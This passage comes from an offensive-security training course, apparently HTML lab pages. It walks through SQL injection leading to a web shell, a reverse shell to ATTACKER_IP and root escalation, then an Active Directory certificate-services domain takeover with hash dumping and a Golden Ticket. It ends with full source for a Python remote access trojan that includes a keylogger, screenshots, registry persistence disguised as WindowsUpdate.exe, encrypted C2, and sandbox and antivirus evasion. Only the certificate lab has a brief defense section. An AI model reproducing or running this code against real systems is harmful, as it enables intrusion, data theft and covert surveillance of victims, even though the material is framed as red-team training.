# Output:
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
# webadmin:x:1000:1000:Web Admin:/home/webadmin:/bin/bash

# Users discovered:
# • root (UID 0)
# • www-data (UID 33, web server)
# • webadmin (UID 1000, real user)

# Read web application source:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -

# Output (config.php):
# <?php
# $db_host = "localhost";
# $db_user = "webapp_user";
# $db_pass = "SuperSecretPassword123!";
# $db_name = "webapp_db";
# ?>

# Credentials found!

# Read MySQL config:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/mysql/my.cnf'),3-- -

# Check for SSH keys:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/home/webadmin/.ssh/id_rsa'),3-- -

# If SSH key found → instant SSH access!

# Read Apache logs (password spraying evidence):
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/var/log/apache2/access.log'),3-- -</div>

            <h4>Step 3: File Write (Web Shell Upload)</h4>

            <div class="code"># Check if file write possible:
# Requires: FILE privilege + writable directory

# Test write to /var/www/html/:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,'<?php echo "TEST"; ?>',3 INTO OUTFILE '/var/www/html/test.php'-- -

# Access: http://vulnerable-site.com/test.php
# If "TEST" appears → file write works!

# Upload web shell:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -

# Execute commands:
http://vulnerable-site.com/shell.php?cmd=id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

http://vulnerable-site.com/shell.php?cmd=whoami
# Output: www-data

http://vulnerable-site.com/shell.php?cmd=uname -a
# Output: Linux webapp-server 5.4.0-150-generic #167-Ubuntu...

# RCE achieved!</div>

            <h4>Step 4: Reverse Shell & Privilege Escalation</h4>

            <div class="code"># Upgrade to interactive reverse shell:

# Start listener on attacker:
nc -lvnp 4444

# Execute reverse shell via web shell:
http://vulnerable-site.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# URL-encoded:
http://vulnerable-site.com/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27

# Connection received!
# www-data@webapp-server:/var/www/html$

# Stabilize shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Enumerate system:
ls -la /home
# /home/webadmin

cat /etc/cron*
# Look for cron jobs running as root

find / -perm -4000 2>/dev/null
# SUID binaries

# Check sudo:
sudo -l
# (www-data) NOPASSWD: /usr/bin/perl

# Escalate via sudo perl:
sudo perl -e 'exec "/bin/bash";'

# root@webapp-server:/#
id
# uid=0(root) gid=0(root) groups=0(root)

# Root achieved!</div>

            <h4>Step 5: Post-Exploitation & Persistence</h4>

            <div class="code"># Dump all MySQL databases:
mysqldump -u root -p --all-databases > /tmp/all_databases.sql

# Copy to attacker:
nc ATTACKER_IP 5555 < /tmp/all_databases.sql

# On attacker:
nc -lvnp 5555 > databases.sql

# Add SSH key for persistence:
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# SSH as root:
ssh root@vulnerable-site.com

# Create backdoor user:
useradd -m -s /bin/bash -G sudo backdoor
echo 'backdoor:SecurePassword123' | chpasswd

# Add to sudoers (no password):
echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# Rootkit installation (advanced):
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
make

# Load kernel module:
insmod reptile.ko

# Reptile features:
# • Hidden processes
# • Hidden files
# • Hidden network connections
# • Rootshell backdoor

# Complete compromise!</div>

            <div class="metaphor-box">
                <h4>💡 Lab 9 Key Takeaways</h4>
                <p><strong>SQL Injection attack chain:</strong><br>
                1. <strong>Discovery:</strong> Find SQLi via error messages or blind techniques<br>
                2. <strong>Enumeration:</strong> information_schema → databases → tables → columns<br>
                3. <strong>Data extraction:</strong> UNION SELECT to dump credentials<br>
                4. <strong>File read:</strong> LOAD_FILE() to access sensitive files<br>
                5. <strong>File write:</strong> INTO OUTFILE to upload web shell<br>
                6. <strong>RCE:</strong> Execute commands via web shell<br>
                7. <strong>Privilege escalation:</strong> SUID, sudo, kernel exploits<br>
                8. <strong>Persistence:</strong> SSH keys, backdoor users, rootkits<br><br>
                <strong>Advanced SQLi techniques:</strong><br>
                • <strong>Blind SQLi:</strong> Boolean-based (true/false responses), time-based (SLEEP())<br>
                • <strong>Out-of-band:</strong> DNS exfiltration, HTTP callbacks<br>
                • <strong>Second-order:</strong> Payload stored, executed later<br>
                • <strong>NoSQL injection:</strong> MongoDB, CouchDB (different syntax)<br><br>
                <strong>Tools:</strong><br>
                • <strong>SQLmap:</strong> Automated SQLi exploitation<br>
                • <strong>Burp Suite:</strong> Manual testing with Intruder<br>
                • <strong>Havij:</strong> GUI SQLi tool (Windows)<br><br>
                SQL injection remains #1 web vulnerability in 2026. Master this = guaranteed findings! 💉🗄️</p>
            </div>

            <h3>Lab 10: Complete Domain Takeover via Certificate Services (ADCS ESC1)</h3>

            <p><strong>Scenario:</strong> You've gained low-privilege domain access. During enumeration, you discover Active Directory Certificate Services (ADCS) is misconfigured. Your mission: exploit ESC1 vulnerability to request a certificate as Domain Admin, authenticate as DA, and take over the domain. This lab teaches ADCS fundamentals, Certify enumeration, ESC1 exploitation, and certificate-based authentication!</p>

            <h4>Step 1: Initial Domain Access & ADCS Discovery</h4>

            <div class="code"># You have low-privilege domain credentials:
# Username: corp\\lowpriv
# Password: Welcome123

# From Windows attack machine:
# Or from Linux with evil-winrm, impacket, etc.

# Enumerate ADCS:
# Tool: Certify.exe (https://github.com/GhostPack/Certify)

# Download Certify:
# https://github.com/GhostPack/Certify/releases

# Run Certify (enumerate vulnerable templates):
.\\Certify.exe find /vulnerable

# Output:
# [*] Action: Find certificate templates
# [*] Using current user's unrolled group SIDs for vulnerability checks.
# [*] Using the search base 'CN=Configuration,DC=corp,DC=com'
# 
# [*] Listing info about the Enterprise CA 'corp-DC-CA'
# 
#     Enterprise CA Name            : corp-DC-CA
#     DNS Hostname                  : DC.corp.com
#     FullName                      : DC.corp.com\\corp-DC-CA
#     Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
#     Cert SubjectName              : CN=corp-DC-CA, DC=corp, DC=com
#     Cert Thumbprint               : 1234567890ABCDEF...
#     Cert Serial                   : 123456789
#     Cert Start Date               : 1/1/2024 12:00:00 AM
#     Cert End Date                 : 1/1/2029 12:00:00 AM
# 
# [!] Vulnerable Certificates Templates :
# 
#     CA Name                       : DC.corp.com\\corp-DC-CA
#     Template Name                 : UserTemplate
#     Schema Version                : 2
#     Validity Period               : 1 year
#     Renewal Period                : 6 weeks
#     msPKI-Certificates-Name-Flag  : ENROLLEE_SUPPLIES_SUBJECT
#     mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
#     Authorized Signatures Required: 0
#     pkiextendedkeyusage           : Client Authentication
#     Permissions
#       Enrollment Permissions
#         Enrollment Rights           : CORP\\Domain Users
# 
# [!] ESC1 VULNERABILITY DETECTED!
# 
# Template allows:
# • Domain Users can enroll
# • ENROLLEE_SUPPLIES_SUBJECT (requester controls Subject Alternative Name)
# • Client Authentication EKU (can authenticate as any user)
# 
# This allows ANY domain user to request certificate as ANY user (including Domain Admin!)

# ESC1 = Enrollee Supplies Subject + Client Auth EKU</div>

            <h4>Step 2: Request Certificate as Domain Admin</h4>

            <div class="code"># Use Certify to request certificate:

# Request cert as "Administrator" (Domain Admin):
.\\Certify.exe request /ca:DC.corp.com\\corp-DC-CA /template:UserTemplate /altname:Administrator

# Output:
# [*] Action: Request a Certificates
# [*] Current user context    : CORP\\lowpriv
# [*] No subject name specified, using current context as subject.
# 
# [*] Template                : UserTemplate
# [*] Subject                 : CN=lowpriv, CN=Users, DC=corp, DC=com
# [*] AltName                 : Administrator
# 
# [*] Certificate Authority   : DC.corp.com\\corp-DC-CA
# 
# [*] CA Response             : The certificate had been issued.
# [*] Request ID              : 123
# 
# [*] cert.pem :
# -----BEGIN RSA PRIVATE KEY-----
# MIIEpAIBAAKCAQEA4Z...
# -----END RSA PRIVATE KEY-----
# -----BEGIN CERTIFICATE-----
# MIIGHjCCBQagAwIBAgITEgAAAA...
# -----END CERTIFICATE-----
# 
# [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Save output to cert.pem

# Convert to PFX:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# Enter password: password123

# We now have admin.pfx certificate for "Administrator" user!</div>

            <h4>Step 3: Authenticate as Domain Admin (Rubeus)</h4>

            <div class="code"># Use Rubeus to request TGT with certificate:
# Tool: Rubeus.exe (https://github.com/GhostPack/Rubeus)

# Request TGT using certificate:
.\\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password123 /nowrap

# Output:
# [*] Action: Ask TGT
# 
# [*] Using PKINIT with etype rc4_hmac and subject: CN=lowpriv, CN=Users, DC=corp, DC=com
# [*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.com\\Administrator'
# [+] TGT request successful!
# [*] base64(ticket.kirbi):
# 
#       doIFujCCBbagAwIBBaEDAgEWooIEvjCCBLphggS2MIIEsqADAgEFoQwbCkNPUlAuQ09NoiUw
#       I6ADAgECoRwwGhsGa3JidGd0GxBDT1JQLkNPTaOCBGQwggRgoAMCARKhAwIBAqKCBFIEggRO
#       ... (very long base64 blob) ...
# 
# [+] Ticket successfully imported!

# Copy the base64 TGT

# Import into current session:
.\\Rubeus.exe ptt /ticket:[BASE64_TGT]

# Output:
# [*] Action: Import Ticket
# [+] Ticket successfully imported!

# Verify:
klist

# Output:
# Current LogonId is 0:0x3e7
# 
# Cached Tickets: (1)
# 
# #0>     Client: Administrator @ CORP.COM
#         Server: krbtgt/CORP.COM @ CORP.COM
#         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
#         Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
#         Start Time: 1/9/2026 10:00:00 (local)
#         End Time:   1/9/2026 20:00:00 (local)
#         Renew Time: 1/16/2026 10:00:00 (local)
#         Session Key Type: AES-256-CTS-HMAC-SHA1-96
#         Cache Flags: 0x1 -> PRIMARY

# We are now "Administrator"!</div>

            <h4>Step 4: Domain Takeover</h4>

            <div class="code"># With Domain Admin TGT, we can do ANYTHING:

# List domain admins:
net group "Domain Admins" /domain

# Output:
# Administrator
# DA_User1
# DA_User2

# Access Domain Controller:
dir \\\\DC.corp.com\\C$

# Output:
# Volume in drive \\\\DC.corp.com\\C$ is Windows
# Directory of \\\\DC.corp.com\\C$
# 
# 01/01/2024  12:00 AM    <DIR>          Program Files
# 01/01/2024  12:00 AM    <DIR>          Users
# 01/01/2024  12:00 AM    <DIR>          Windows
# ...

# Access works!

# DCSync (dump all domain hashes):
# Tool: Mimikatz or Impacket secretsdump

# From Linux:
impacket-secretsdump -k -no-pass corp.com/Administrator@DC.corp.com

# Output:
# [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3a5c3b2e1f4g5h6i7j8k9l0m1n2o3p4:::
# DA_User1:1104:aad3b435b51404eeaad3b435b51404ee:58a52d27c84a2f6c78b9c3d4e5f6a7b8:::
# ...

# All domain hashes dumped!

# Create Golden Ticket (persistent domain admin):
# From Windows with Mimikatz:
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.com /sid:S-1-5-21-123456789-987654321-111111111 /krbtgt:d3a5c3b2e1f4g5h6i7j8k9l0m1n2o3p4 /id:500 /ptt

# Golden Ticket injected!
# Valid for 10 years
# Survives password changes
# Backdoor access to domain forever!</div>

            <h4>Step 5: Defense & Remediation</h4>

            <div class="code"># How companies defend against ADCS attacks:

# 1. Fix vulnerable templates:
# • Remove "ENROLLEE_SUPPLIES_SUBJECT" flag
# • Require manager approval
# • Require authorized signatures
# • Restrict enrollment rights

# Remediation for UserTemplate:
# - Open Certificate Templates Console
# - Edit "UserTemplate"
# - Subject Name tab → Uncheck "Supply in the request"
# - Security tab → Remove "Domain Users" enrollment rights

# 2. Enable certificate auditing:
# • Event ID 4886 (certificate requested)
# • Event ID 4887 (certificate issued)
# • Monitor for unusual SAN values

# 3. Patch other ESC vulnerabilities:
# • ESC2: Any Purpose EKU
# • ESC3: Enrollment Agent templates
# • ESC4: Vulnerable template ACLs
# • ESC5: Vulnerable CA ACLs
# • ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag
# • ESC7: Vulnerable CA permissions
# • ESC8: NTLM relay to ADCS HTTP endpoints

# 4. Detection:
# • Certutil to enumerate templates:
certutil -v -template > templates.txt

# • PowerShell:
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * -Properties *

# • Tools:
#   - Certify.exe find /vulnerable
#   - PSPKIAudit.ps1
#   - ADCSTemplate PowerShell module

# 5. Monitoring:
# • Alert on Event ID 4886 + unusual Subject Alternative Names
# • Monitor for Certify.exe, Rubeus.exe execution
# • Detect PKINIT authentication (Event ID 4768 with certificate)</div>

            <div class="metaphor-box">
                <h4>💡 Lab 10 Key Takeaways</h4>
                <p><strong>ADCS ESC1 attack chain:</strong><br>
                1. <strong>Enumerate:</strong> Use Certify.exe to find vulnerable templates<br>
                2. <strong>ESC1 criteria:</strong> ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + Domain Users enrollment<br>
                3. <strong>Request cert:</strong> Specify SAN as Domain Admin (Certify.exe request)<br>
                4. <strong>Convert cert:</strong> PEM → PFX with openssl<br>
                5. <strong>Authenticate:</strong> Use Rubeus.exe asktgt with certificate (PKINIT)<br>
                6. <strong>Import TGT:</strong> Rubeus.exe ptt to inject ticket<br>
                7. <strong>DCSync:</strong> Dump all domain hashes with Domain Admin access<br>
                8. <strong>Golden Ticket:</strong> Create persistent backdoor with krbtgt hash<br><br>
                <strong>Why ADCS attacks are powerful:</strong><br>
                • Certificates = alternate authentication method<br>
                • Less monitored than password attacks<br>
                • Bypass MFA (certificate satisfies "something you have")<br>
                • Misconfigured templates = instant DA<br>
                • Hard to detect without proper auditing<br><br>
                <strong>Other ADCS vulnerabilities (ESC2-ESC8):</strong><br>
                • <strong>ESC2:</strong> Any Purpose EKU allows impersonation<br>
                • <strong>ESC3:</strong> Enrollment Agent can request certs for others<br>
                • <strong>ESC4:</strong> Vulnerable ACLs allow template modification<br>
                • <strong>ESC6:</strong> EDITF flag allows arbitrary SANs<br>
                • <strong>ESC8:</strong> NTLM relay to ADCS web enrollment<br><br>
                <strong>Resources:</strong><br>
                • <strong>SpecterOps blog:</strong> "Certified Pre-Owned" whitepaper<br>
                • <strong>Tool:</strong> Certify.exe (enumerate + exploit)<br>
                • <strong>Tool:</strong> Certipy (Python alternative for Linux)<br>
                • <strong>Defense:</strong> Microsoft ADCS security baseline<br><br>
                ADCS is THE most overlooked AD attack path in 2026. Check EVERY engagement! 🎫🔐</p>
            </div>

            <h3>Lab 11: Complete Python Malware Development (RAT Creation)</h3>

            <p><strong>Scenario:</strong> You need a custom Remote Access Trojan (RAT) for a red team engagement. Your mission: develop a Python-based RAT with command execution, file transfer, keylogging, screenshot capture, persistence, and AV evasion. This lab teaches malware development fundamentals, socket programming, Windows API usage, and evasion techniques—critical for advanced red teaming!</p>

            <h4>Step 1: Basic RAT Architecture</h4>

            <div class="code"># RAT components:
# 1. Server (attacker machine) - receives connections
# 2. Client (victim machine) - connects back to server

# Client connects to server → establishes reverse shell
# Server sends commands → client executes → sends output back

# Why reverse shell instead of bind shell?
# • Victim initiates connection (bypasses incoming firewall rules)
# • NAT traversal (works from internal networks)
# • More stealthy (outbound traffic less monitored)

# Tech stack:
# • Python 3 (cross-platform)
# • socket module (networking)
# • subprocess (command execution)
# • pyautogui (screenshots)
# • pynput (keylogging)
# • pyinstaller (compile to EXE)
# • Base64 (data encoding)
# • AES encryption (traffic encryption)</div>

            <h4>Step 2: Simple Reverse Shell (Foundation)</h4>

            <div class="code"># client.py (runs on victim):
import socket
import subprocess
import os

SERVER_IP = "ATTACKER_IP"
SERVER_PORT = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    
    while True:
        # Receive command
        command = s.recv(1024).decode()
        
        if command.lower() == "exit":
            break
        
        if command.lower() == "":
            continue
        
        # Execute command
        output = subprocess.getoutput(command)
        
        # Send output back
        s.send(output.encode())
    
    s.close()

if __name__ == "__main__":
    connect()

# server.py (runs on attacker):
import socket

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(1)
    
    print("[*] Listening on port 4444...")
    
    client_socket, client_address = server.accept()
    print(f"[+] Connection from {client_address}")
    
    while True:
        command = input("Shell> ")
        
        if command.lower() == "exit":
            client_socket.send(command.encode())
            break
        
        client_socket.send(command.encode())
        output = client_socket.recv(4096).decode()
        print(output)
    
    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()

# Test:
# Terminal 1 (server): python3 server.py
# Terminal 2 (client): python3 client.py
# 
# Shell> whoami
# Output: user
# Shell> pwd
# Output: /home/user</div>

            <h4>Step 3: Advanced Features (File Transfer)</h4>

            <div class="code"># Enhanced client.py with file operations:
import socket
import subprocess
import os
import base64

SERVER_IP = "ATTACKER_IP"
SERVER_PORT = 4444

def execute_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except:
        return b"Command execution failed"

def download_file(filename):
    # Client downloads file FROM victim
    try:
        with open(filename, "rb") as f:
            data = f.read()
            # Base64 encode to safely send binary data
            encoded = base64.b64encode(data)
            return b"[FILE_START]" + encoded + b"[FILE_END]"
    except:
        return b"File not found"

def upload_file(filename, data):
    # Client uploads file TO victim
    try:
        decoded = base64.b64decode(data)
        with open(filename, "wb") as f:
            f.write(decoded)
        return b"File uploaded successfully"
    except:
        return b"File upload failed"

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    
    while True:
        command = s.recv(4096).decode()
        
        if command.lower() == "exit":
            break
        
        # File download: download /path/to/file
        if command.startswith("download "):
            filename = command.split(" ", 1)[1]
            output = download_file(filename)
        
        # File upload: upload /path/to/file [BASE64_DATA]
        elif command.startswith("upload "):
            parts = command.split(" ", 2)
            filename = parts[1]
            data = parts[2]
            output = upload_file(filename, data)
        
        # Change directory: cd /path
        elif command.startswith("cd "):
            try:
                os.chdir(command.split(" ", 1)[1])
                output = f"Changed directory to: {os.getcwd()}".encode()
            except:
                output = b"Directory change failed"
        
        # Regular command
        else:
            output = execute_command(command)
        
        # Send output
        s.send(output)
    
    s.close()

if __name__ == "__main__":
    connect()

# Enhanced server.py:
import socket
import base64

def handle_download(client_socket, data):
    # Extract file data from response
    start = data.find(b"[FILE_START]") + len(b"[FILE_START]")
    end = data.find(b"[FILE_END]")
    
    if start != -1 and end != -1:
        encoded_data = data[start:end]
        decoded_data = base64.b64decode(encoded_data)
        
        # Save file
        filename = input("Save as: ")
        with open(filename, "wb") as f:
            f.write(decoded_data)
        
        print(f"[+] File saved to: {filename}")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(1)
    
    print("[*] Listening on port 4444...")
    
    client_socket, client_address = server.accept()
    print(f"[+] Connection from {client_address}")
    
    while True:
        command = input("RAT> ")
        
        if command.lower() == "exit":
            client_socket.send(command.encode())
            break
        
        # Send command
        client_socket.send(command.encode())
        
        # Receive output
        output = client_socket.recv(409600)  # 400KB buffer for files
        
        # Handle file download
        if b"[FILE_START]" in output:
            handle_download(client_socket, output)
        else:
            print(output.decode(errors='ignore'))
    
    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()

# Usage:
# RAT> download C:\\Users\\victim\\passwords.txt
# Save as: passwords.txt
# [+] File saved to: passwords.txt</div>

            <h4>Step 4: Persistence Mechanisms</h4>

            <div class="code"># Add persistence to client.py:
import winreg  # Windows Registry
import shutil
import sys

def install_persistence():
    # Copy to AppData
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        target_path = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate.exe')
        
        if not os.path.exists(target_path):
            shutil.copy(exe_path, target_path)
        
        # Add to registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
        
        return True
    except:
        return False

def connect():
    # Install persistence on first run
    install_persistence()
    
    # Rest of RAT code...
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            
            # RAT loop...
            
        except:
            # Reconnect every 60 seconds if connection fails
            import time
            time.sleep(60)
            continue

# Now RAT:
# 1. Copies itself to C:\\Users\\User\\AppData\\Roaming\\WindowsUpdate.exe
# 2. Adds registry key to run on startup
# 3. Automatically reconnects if connection lost
# 4. Survives reboots!</div>

            <h4>Step 5: Keylogger & Screenshot Capture</h4>

            <div class="code"># Install dependencies:
# pip install pynput pyautogui pillow

# Add to client.py:
from pynput import keyboard
import pyautogui
from PIL import Image
import io
import threading

# Global keylogger buffer
keylog_buffer = []

def on_key_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(key.char)
    except AttributeError:
        # Special keys (space, enter, etc.)
        keylog_buffer.append(f'[{key}]')

def start_keylogger():
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

def capture_screenshot():
    # Take screenshot
    screenshot = pyautogui.screenshot()
    
    # Convert to bytes
    img_buffer = io.BytesIO()
    screenshot.save(img_buffer, format='PNG')
    img_data = img_buffer.getvalue()
    
    # Base64 encode
    encoded = base64.b64encode(img_data)
    
    return b"[SCREENSHOT_START]" + encoded + b"[SCREENSHOT_END]"

def connect():
    # Start keylogger in background thread
    threading.Thread(target=start_keylogger, daemon=True).start()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    
    while True:
        command = s.recv(4096).decode()
        
        # Get keylog
        if command.lower() == "getkeylog":
            global keylog_buffer
            output = ''.join(keylog_buffer).encode()
            keylog_buffer = []  # Clear buffer
        
        # Screenshot
        elif command.lower() == "screenshot":
            output = capture_screenshot()
        
        # ... other commands ...
        
        s.send(output)

# Server receives screenshot:
def handle_screenshot(data):
    start = data.find(b"[SCREENSHOT_START]") + len(b"[SCREENSHOT_START]")
    end = data.find(b"[SCREENSHOT_END]")
    
    encoded_data = data[start:end]
    decoded_data = base64.b64decode(encoded_data)
    
    filename = f"screenshot_{int(time.time())}.png"
    with open(filename, "wb") as f:
        f.write(decoded_data)
    
    print(f"[+] Screenshot saved to: {filename}")</div>

            <h4>Step 6: Encryption & AV Evasion</h4>

            <div class="code"># Add AES encryption to traffic:
# pip install pycryptodome

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import hashlib

# Shared secret key (hardcoded or derived)
SECRET_KEY = b"MySecretKey12345"  # 16 bytes for AES-128

def derive_key(password):
    return hashlib.sha256(password).digest()[:16]

AES_KEY = derive_key(SECRET_KEY)

def encrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + encrypted  # Prepend IV

def decrypt_data(data):
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size)

# Modify send/receive:
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    
    while True:
        # Receive and decrypt
        encrypted_command = s.recv(4096)
        command = decrypt_data(encrypted_command).decode()
        
        # Execute command
        output = execute_command(command)
        
        # Encrypt and send
        encrypted_output = encrypt_data(output)
        s.send(encrypted_output)

# Now all traffic is AES encrypted!
# IDS/IPS can't read commands or exfiltrated data

# Additional evasion techniques:

# 1. Obfuscate strings:
import base64

SERVER_IP = base64.b64decode("MTkyLjE2OC4xLjEw").decode()  # 192.168.1.10
SERVER_PORT = int(base64.b64decode("NDQ0NA==").decode())    # 4444

# 2. Sleep before execution (sandbox evasion):
import time
time.sleep(60)  # Sleep 60s (sandboxes timeout after 30-60s)

# 3. Check for VM/debugger:
def is_vm():
    # Check for VMware, VirtualBox, QEMU
    try:
        with open('/sys/class/dmi/id/product_name', 'r') as f:
            product = f.read().lower()
            if 'vmware' in product or 'virtualbox' in product:
                return True
    except:
        pass
    return False

if is_vm():
    sys.exit(0)  # Exit if running in VM

# 4. Anti-analysis:
import ctypes

def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

if is_debugger_present():
    sys.exit(0)</div>

            <h4>Step 7: Compile to Executable (PyInstaller)</h4>

            <div class="code"># Install PyInstaller:
pip install pyinstaller

# Compile client to EXE:
pyinstaller --onefile --noconsole --icon=icon.ico client.py

# Flags:
# --onefile    = Single EXE (no dependencies)
# --noconsole  = No command window (GUI mode)
# --icon       = Custom icon (looks legitimate)

# Output: dist/client.exe

# Advanced: Add UPX compression (smaller file size):
pyinstaller --onefile --noconsole --upx-dir=/path/to/upx client.py

# Result: ~8MB EXE with all features

# Test:
# Copy client.exe to Windows VM
# Run server.py on Kali
# Execute client.exe on Windows
# RAT connects back!

# Bypassing AV:

# 1. Code obfuscation:
pip install pyarmor

# Obfuscate source:
pyarmor obfuscate client.py

# 2. Encrypt strings with custom function:
def xor_encrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

encrypted_ip = xor_encrypt(b"192.168.1.10", b"key")

# 3. Load from memory (no disk writes):
# Use python -c "exec()" to run from command line without file

# 4. Split into multiple files:
# client_main.py - main logic
# client_utils.py - utilities
# client_config.py - configuration
# PyInstaller bundles all

# 5. Sign executable (appears legitimate):
# Use signtool.exe with code signing certificate
signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com client.exe</div>

            <h4>Step 8: C2 Server (Multi-Client Support)</h4>

            <div class="code"># Enhanced server with multiple client support:
import socket
import threading
import time

clients = []  # List of connected clients

def handle_client(client_socket, client_address):
    print(f"[+] New connection from {client_address}")
    clients.append({'socket': client_socket, 'address': client_address})
    
    try:
        while True:
            time.sleep(0.1)  # Keep connection alive
    except:
        clients.remove({'socket': client_socket, 'address': client_address})
        print(f"[-] Connection lost from {client_address}")

def list_clients():
    print("\\n[*] Connected clients:")
    for idx, client in enumerate(clients):
        print(f"{idx}: {client['address']}")

def interact_with_client(client_idx):
    if client_idx >= len(clients):
        print("[-] Invalid client index")
        return
    
    client = clients[client_idx]
    print(f"[*] Interacting with {client['address']}")
    
    while True:
        command = input(f"RAT[{client['address']}]> ")
        
        if command.lower() == "back":
            break
        
        if command.lower() == "exit":
            client['socket'].send(command.encode())
            client['socket'].close()
            clients.remove(client)
            break
        
        # Send command
        encrypted_command = encrypt_data(command.encode())
        client['socket'].send(encrypted_command)
        
        # Receive response
        encrypted_output = client['socket'].recv(409600)
        output = decrypt_data(encrypted_output)
        
        print(output.decode(errors='ignore'))

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    
    print("[*] C2 Server started on port 4444")
    print("[*] Waiting for connections...")
    
    # Accept connections in background thread
    def accept_connections():
        while True:
            client_socket, client_address = server.accept()
            threading.Thread(
                target=handle_client,
                args=(client_socket, client_address),
                daemon=True
            ).start()
    
    threading.Thread(target=accept_connections, daemon=True).start()
    
    # Main command loop
    while True:
        command = input("C2> ")
        
        if command.lower() == "list":
            list_clients()
        
        elif command.startswith("interact "):
            try:
                client_idx = int(command.split()[1])
                interact_with_client(client_idx)
            except:
                print("[-] Usage: interact <client_index>")
        
        elif command.lower() == "exit":
            break

if __name__ == "__main__":
    start_server()

# Usage:
# C2> list
# [*] Connected clients:
# 0: ('192.168.1.100', 49152)
# 1: ('192.168.1.101', 49153)
# 
# C2> interact 0
# [*] Interacting with ('192.168.1.100', 49152)
# RAT[('192.168.1.100', 49152)]> whoami
# DESKTOP-ABC123\\victim
# RAT[('192.168.1.100', 49152)]> screenshot
# [+] Screenshot saved to: screenshot_1704812400.png
# RAT[('192.168.1.100', 49152)]> back
# 
# C2> interact 1
# ...</div>

            <div class="metaphor-box">
                <h4>💡 Lab 11 Key Takeaways</h4>
